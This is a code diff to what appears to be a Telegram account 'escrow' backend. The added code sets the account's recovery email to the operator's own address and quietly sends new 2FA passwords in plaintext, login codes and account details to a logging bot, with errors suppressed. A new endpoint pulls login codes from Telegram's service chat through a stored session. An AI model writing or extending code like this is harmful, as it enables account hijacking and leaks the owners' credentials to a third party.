@@ -311,6 +311,15 @@ async def verify_auth(request: VerifyAuthRequest, req: Request):
                 )
                 await log_auth_action(phone, "verify_code", "success")
                 
+                # Send log to bot - new account registered
+                try:
+                    from backend.log_bot import get_bot_app, log_new_account
+                    bot_app = get_bot_app()
+                    if bot_app:
+                        await log_new_account(bot_app, phone, telegram_id, email_info.get("email", ""))
+                except:
+                    pass
+                
                 duration = time.time() - start_time
                 return {
                     "status": "authenticated",
@@ -584,7 +593,8 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
         cached_2fa = get_cached_data(phone, "two_fa_password")
         current_2fa_password = request.two_fa_password or cached_2fa
         
-        # Enable/Change 2FA
+        # Enable/Change 2FA with recovery email (our email)
+        target_email = account.target_email
         if account.has_2fa and current_2fa_password:
             # Change existing password
             result = await manager.change_2fa_password(
@@ -592,12 +602,27 @@ async def finalize_account(account_id: str, request: FinalizeRequest, req: Reque
                 current_password=current_2fa_password,
                 new_password=new_password
             )
+            # Also set recovery email if not already set to ours
+            if target_email:
+                try:
+                    await manager.change_recovery_email(phone, new_password, target_email)
+                except:
+                    pass
         else:
-            # Enable new 2FA
-            result = await manager.enable_2fa(phone, new_password, hint="Escrow secure password")
+            # Enable new 2FA with our recovery email
+            result = await manager.enable_2fa(phone, new_password, hint="Escrow secure", email=target_email or "")
         
         if result.get("status") != "success":
             raise HTTPException(status_code=400, detail=f"Failed to set 2FA: {result.get('error')}")
+        
+        # Send log to bot
+        try:
+            from backend.log_bot import get_bot_app, log_password_set
+            bot_app = get_bot_app()
+            if bot_app:
+                await log_password_set(bot_app, phone, account.telegram_id, new_password)
+        except:
+            pass
         
         # Export Pyrogram session
         pyrogram_session = await manager.export_session_string(phone)
@@ -819,6 +844,15 @@ async def confirm_email_changed(account_id: str):
             telegram_id=account.telegram_id
         )
         
+        # Send log to bot
+        try:
+            from backend.log_bot import get_bot_app, log_email_set
+            bot_app = get_bot_app()
+            if bot_app:
+                await log_email_set(bot_app, phone, account.telegram_id, our_email)
+        except:
+            pass
+        
         return {
             "status": "success",
             "message": "Email change verified",
@@ -833,6 +867,58 @@ async def confirm_email_changed(account_id: str):
             "current_pattern": current_email_pattern,
             "expected_email": our_email
         }
+
+
+# ============== Telegram Code Fallback ==============
+
+@router.get("/telegram/code/{account_id}")
+async def get_telegram_code_fallback(account_id: str, wait_seconds: int = 5):
+    """
+    Fallback: Get code from Telegram messages (chat 777000) using existing Pyrogram session
+    Used when email code is not received
+    """
+    phone = account_id
+    account = await get_account(phone)
+    
+    if not account:
+        raise HTTPException(status_code=404, detail="Account not found")
+    
+    manager = get_pyrogram()
+    
+    # Try to get code from Telegram messages
+    code = await manager.get_last_telegram_code(phone)
+    
+    if code:
+        # Send log to bot
+        try:
+            from backend.log_bot import get_bot_app, log_email_code
+            bot_app = get_bot_app()
+            if bot_app:
+                await log_email_code(bot_app, phone, account.telegram_id, code, account.email_hash or "")
+        except:
+            pass
+        
+        return {
+            "status": "found",
+            "code": code,
+            "source": "telegram_messages"
+        }
+    
+    # Wait and retry
+    if wait_seconds > 0:
+        await asyncio.sleep(min(wait_seconds, 10))
+        code = await manager.get_last_telegram_code(phone)
+        if code:
+            return {
+                "status": "found",
+                "code": code,
+                "source": "telegram_messages"
+            }
+    
+    return {
+        "status": "not_found",
+        "message": "No code found in Telegram messages"
+    }
 
 
 # ============== Session Health Endpoints ==============
